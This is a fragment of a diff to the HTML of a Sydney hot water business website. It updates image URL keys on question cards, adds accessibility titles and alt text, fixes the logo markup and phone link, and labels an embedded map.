+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-size-hot-water-tank-for-family-of-4-326630.jpg?key=g9K849" alt="What size hot water tank for family of 4?" class="rounded"
                                  width="80" height="80">
                             <a href="what-size-hot-water-tank-for-family-of-4.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 What size hot water tank for family of 4?
@@ -656,7 +658,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/should-i-upgrade-my-hot-water-cylinder-326631.jpg?key=nmw0Hk" alt="Should I upgrade my hot water cylinder?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/should-i-upgrade-my-hot-water-cylinder-326631.jpg?key=YG2qXO" alt="Should I upgrade my hot water cylinder?" class="rounded"
                                  width="80" height="80">
                             <a href="should-i-upgrade-my-hot-water-cylinder.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Should I upgrade my hot water cylinder?
@@ -668,7 +670,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/can-i-replace-my-water-heater-with-a-larger-one-326632.jpg?key=6TKLh8" alt="Can I replace my water heater with a larger one?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/can-i-replace-my-water-heater-with-a-larger-one-326632.jpg?key=urdkTF" alt="Can I replace my water heater with a larger one?" class="rounded"
                                  width="80" height="80">
                             <a href="can-i-replace-my-water-heater-with-a-larger-one.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Can I replace my water heater with a larger one?
@@ -680,7 +682,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/who-is-eligible-for-free-hot-water-upgrade-in-nsw-1-326836.jpg?key=IfRbuH" alt="Who is eligible for free hot water upgrade in NSW?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/who-is-eligible-for-free-hot-water-upgrade-in-nsw-1-326836.jpg?key=BeteC1" alt="Who is eligible for free hot water upgrade in NSW?" class="rounded"
                                  width="80" height="80">
                             <a href="who-is-eligible-for-free-hot-water-upgrade-in-nsw-1.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Who is eligible for free hot water upgrade in NSW?
@@ -692,7 +694,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/is-a-new-hot-water-system-tax-deductible-326837.jpg?key=UAROFW" alt="Is a new hot water system tax deductible?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/is-a-new-hot-water-system-tax-deductible-326837.jpg?key=I0qCAd" alt="Is a new hot water system tax deductible?" class="rounded"
                                  width="80" height="80">
                             <a href="is-a-new-hot-water-system-tax-deductible.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Is a new hot water system tax deductible?
@@ -724,14 +726,16 @@
             <div class="row g-lg-3">
                 <div class="col-12 col-lg-7 col-xl-7">
                     <div class="vstack gap-5">
-                        <a class="navbar-brand m-0 gap-2 align-items-center" href="index.html">
-                            <!-- Brand Logo/Mark -->
-                            <img fetchpriority="low" async="true" defer="true"
-                                 display: none " src="logo.png" onerror="this.remove()"
-                            height="100" />
-                            <!-- Brand Name -->
-                            <p class="fs-5 fw-medium">Hot Water Experts Sydney</p>
-                        </a>
+                        <div class="d-inline-flex gap-2 align-items-center">
+                            <a class="navbar-brand m-0 gap-2 align-items-center" href="index.html">
+                                <!-- Brand Logo/Mark -->
+                                <img alt="Hot Water Experts Sydney" fetchpriority="low" async="true" defer="true"
+                                     style="display: inherit" src="logo.png" onerror="this.remove()"
+                                     height="100" />
+                                <!-- Brand Name -->
+                                <p class="fs-5 fw-medium">Hot Water Experts Sydney</p>
+                            </a>
+                        </div>
 
                         <div style="display: ">
                             <strong>Address:</strong>
@@ -741,14 +745,14 @@
                         <div style="display: ">
                             <strong>Contact:</strong>
                             <p class="mb-0">
-                                <a href="tel:+18001234567">0490 414 794</a>
+                                <a href="tel:0490 414 794" title="Contact Number">0490 414 794</a>
                                 <br>
-                                <a style="display: " href="mailto:info@hotwaterexpertssydney.com.au">info@hotwaterexpertssydney.com.au</a>
+                                <a style="display: " title="Email Address" href="mailto:info@hotwaterexpertssydney.com.au">info@hotwaterexpertssydney.com.au</a>
                             </p>
                         </div>
 
                         <div class="d-inline-flex gap-4" style="display: none">
-                            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                            <a href=""  title="Facebook Link" class="text-decoration-none" style="display: none" target="_blank">
                                 <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor"
                                      class="bi bi-facebook" viewBox="0 0 16 16">
                                     <path
@@ -756,14 +760,14 @@
                                 </svg>
                             </a>
 
-                            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                            <a href="" title="Instagram Link" class="text-decoration-none" style="display: none" target="_blank">
                                 <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor"
                                      class="bi bi-instagram" viewBox="0 0 16 16">
                                     <path
                                             d="M8 0C5.829 0 5.556.01 4.703.048 3.85.088 3.269.222 2.76.42a3.9 3.9 0 0 0-1.417.923A3.9 3.9 0 0 0 .42 2.76C.222 3.268.087 3.85.048 4.7.01 5.555 0 5.827 0 8.001c0 2.172.01 2.444.048 3.297.04.852.174 1.433.372 1.942.205.526.478.972.923 1.417.444.445.89.719 1.416.923.51.198 1.09.333 1.942.372C5.555 15.99 5.827 16 8 16s2.444-.01 3.298-.048c.851-.04 1.434-.174 1.943-.372a3.9 3.9 0 0 0 1.416-.923c.445-.445.718-.891.923-1.417.197-.509.332-1.09.372-1.942C15.99 10.445 16 10.173 16 8s-.01-2.445-.048-3.299c-.04-.851-.175-1.433-.372-1.941a3.9 3.9 0 0 0-.923-1.417A3.9 3.9 0 0 0 13.24.42c-.51-.198-1.092-.333-1.943-.372C10.443.01 10.172 0 7.998 0zm-.717 1.442h.718c2.136 0 2.389.007 3.232.046.78.035 1.204.166 1.486.275.373.145.64.319.92.599s.453.546.598.92c.11.281.24.705.275 1.485.039.843.047 1.096.047 3.231s-.008 2.389-.047 3.232c-.035.78-.166 1.203-.275 1.485a2.5 2.5 0 0 1-.599.919c-.28.28-.546.453-.92.598-.28.11-.704.24-1.485.276-.843.038-1.096.047-3.232.047s-2.39-.009-3.233-.047c-.78-.036-1.203-.166-1.485-.276a2.5 2.5 0 0 1-.92-.598 2.5 2.5 0 0 1-.6-.92c-.109-.281-.24-.705-.275-1.485-.038-.843-.046-1.096-.046-3.233s.008-2.388.046-3.231c.036-.78.166-1.204.276-1.486.145-.373.319-.64.599-.92s.546-.453.92-.598c.282-.11.705-.24 1.485-.276.738-.034 1.024-.044 2.515-.045zm4.988 1.328a.96.96 0 1 0 0 1.92.96.96 0 0 0 0-1.92m-4.27 1.122a4.109 4.109 0 1 0 0 8.217 4.109 4.109 0 0 0 0-8.217m0 1.441a2.667 2.667 0 1 1 0 5.334 2.667 2.667 0 0 1 0-5.334" />
                                 </svg>
                             </a>
-                            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                            <a href="" title="Twitter Link" title="Twitter Link" class="text-decoration-none" style="display: none" target="_blank">
                                 <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor"
                                      class="bi bi-twitter-x" viewBox="0 0 16 16">
                                     <path
@@ -771,7 +775,7 @@
                                 </svg>
                             </a>
 
-                            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                            <a href="" title="Pinterest Link" class="text-decoration-none" style="display: none" target="_blank">
                                 <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor"
                                      class="bi bi-pinterest-x" viewBox="0 0 496 512">
                                     <path d="M496 256c0 137-111 248-248 248-25.6 0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8 0 128.7-68.8 128.7-154.3 0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1 0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3 .8-3.4 5-20.3 6.9-28.1 .6-2.5 .3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6 0-54.7 41.4-107.6 112-107.6 60.9 0 103.6 41.5 103.6 100.9 0 67.1-33.9 113.6-78 113.6-24.3 0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6 0-19-10.2-34.9-31.4-34.9-24.9 0-44.9 25.7-44.9 60.2 0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9 0 361.1 0 256 0 119 111 8 248 8s248 111 248 248z"/>
@@ -780,7 +784,7 @@
                             </a>
 
 
-                            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                            <a href="" title="Youtube Link" class="text-decoration-none" style="display: none" target="_blank">
                                 <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" fill="currentColor"
                                      class="bi bi-youtube" viewBox="0 0 16 16">
                                     <path
@@ -795,9 +799,8 @@
                     <div class="row">
                         <div class="col-12 col-lg-12 align-self-center">
                             <div class="card h-50 border-0 p-0 bg-section-light" style="display: ">
-                                <iframe
-                                        src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3311.0481185021067!2d151.03226627667377!3d-33.91416112141155!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x6b12bdaa28c01eaf%3A0xc5ab587e68ecf3f5!2sHot%20water%20experts%20sydney%20%7C%20Hot%20water%20repair%20%7C%20Emergency%20hot%20water%20repair%20%7C%20Hot%20water%20system%20installation!5e0!3m2!1sen!2sau!4v1720431946895!5m2!1sen!2sau"
-                                        class="border-0 rounded" height="340" allowfullscreen="" loading="lazy"
+                                <iframe title="Locate Us"
+                                        src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3311.0481185021067!2d151.03226627667377!3d-33.91416112141155!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x6b12bdaa28c01eaf%3A0xc5ab587e68ecf3f5!2sHot%20water%20experts%20sydney%20%7C%20Hot%20water%20repair%20%7C%20Emergency%20hot%20water%20repair%20%7C%20Hot%20water%20system%20installation!5e0!3m2!1sen!2sau!4v1720431946895!5m2!1sen!2sau" class="border-0 rounded" height="340" allowfullscreen="" loading="lazy"
                                         referrerpolicy="no-referrer-when-downgrade"></iframe>
                             </div>
                         </div>
@@ -812,7 +815,6 @@
                 <a href="privacy.html" class="text-start" style="display: inherit">Privacy Policy</a>
                 <a href="terms.html" class="text-center mx-md-4" style="display: inherit">Terms of Service</a>
                 <a href="sitemap.html" class="text-center mx-md-4" style="display: inherit">Sitemap</a>
-
             </div>
         </div>
     </div>
